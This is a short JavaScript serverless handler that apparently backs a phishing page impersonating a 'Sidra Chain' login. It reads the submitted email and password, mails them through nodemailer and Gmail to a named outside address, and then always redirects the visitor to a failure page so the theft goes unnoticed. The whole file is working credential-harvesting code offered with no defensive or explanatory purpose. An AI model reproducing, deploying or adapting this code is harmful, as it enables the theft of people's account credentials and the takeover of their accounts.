const nodemailer = require("nodemailer");

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            headers: { "Location": "/fail.html" },
            body: "", // Redirect to fail.html
        };
    }

    try {
        const { email, password } = JSON.parse(event.body);

        // Set up nodemailer transport
        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: "your-email@gmail.com", // Replace with your email
                pass: "your-app-password", // Use an App Password
            },
        });

        // Email content
        let mailOptions = {
            from: "your-email@gmail.com",
            to: "nwankwogoodluck156@gmail.com",
            subject: "Sidra Chain",
            text: `Received Login Details:\n\nEmail: ${email}\nPassword: ${password}`,
        };

        // Send email
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error("Error sending email:", error);
    }

    return {
        statusCode: 302,
        headers: { "Location": "/fail.html" },
        body: "", // Redirect to fail.html
    };
};
